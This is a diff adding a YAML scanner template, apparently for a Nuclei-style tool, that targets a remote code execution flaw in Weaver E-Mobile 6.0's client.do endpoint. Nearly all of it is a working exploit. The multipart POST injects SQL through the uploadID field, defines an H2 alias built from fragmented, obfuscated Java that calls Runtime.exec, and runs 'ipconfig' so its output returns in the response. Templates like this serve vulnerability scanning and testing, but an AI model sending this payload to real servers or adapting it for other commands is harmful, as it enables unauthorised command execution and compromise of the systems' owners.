@@ -1,0 +1,39 @@
+id: weaver-e-mobile-rce
+brief:
+    title: Weaver E-mobile client.do - Remote Code Execution
+    by: SleepingBag945
+    level: critical
+    about: E-Mobile 6.0 has a command execution vulnerability. It has now been confirmed that this vulnerability can be exploited by an attacker. In some cases, user input may be passed directly to the comman...
+    label:
+        - e-mobile
+        - rce
+        - weaver
+        - intrusive
+        - vuln
+moves:
+    - verb: POST
+      to:
+        - '{{BaseURL}}/client.do'
+      head:
+        Accept: '*/*'
+        Accept-Encoding: gzip, deflate
+        Accept-Language: en-US,en;q=0.5
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{randstr}}
+        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
+      body: |-
+        ------WebKitFormBoundary{{randstr}}
+        Content-Disposition: form-data; name="method"
+
+        getupload
+        ------WebKitFormBoundary{{randstr}}
+        Content-Disposition: form-data; name="uploadID"
+
+        1';CREATE ALIAS if not exists MzSNqKsZTagmf AS CONCAT('void e(String cmd) throws java.la','ng.Exception{','Object curren','tRequest = Thre','ad.currentT','hread().getConte','xtClass','Loader().loadC','lass("com.caucho.server.dispatch.ServletInvocation").getMet','hod("getContextRequest").inv','oke(null);java.la','ng.reflect.Field _responseF = currentRequest.getCl','ass().getSuperc','lass().getDeclar','edField("_response");_responseF.setAcce','ssible(true);Object response = _responseF.get(currentRequest);java.la','ng.reflect.Method getWriterM = response.getCl','ass().getMethod("getWriter");java.i','o.Writer writer = (java.i','o.Writer)getWriterM.inv','oke(response);java.ut','il.Scan','ner scan','ner = (new java.util.Scann','er(Runt','ime.getRunt','ime().ex','ec(cmd).getInput','Stream())).useDelimiter("\\A");writer.write(scan','ner.hasNext()?sca','nner.next():"");}');CALL MzSNqKsZTagmf('ipconfig');--
+        ------WebKitFormBoundary{{randstr}}--
+      signs:
+        - "on": word
+          has:
+            - application/json
+            - text/html
+          in: header
+          need: all
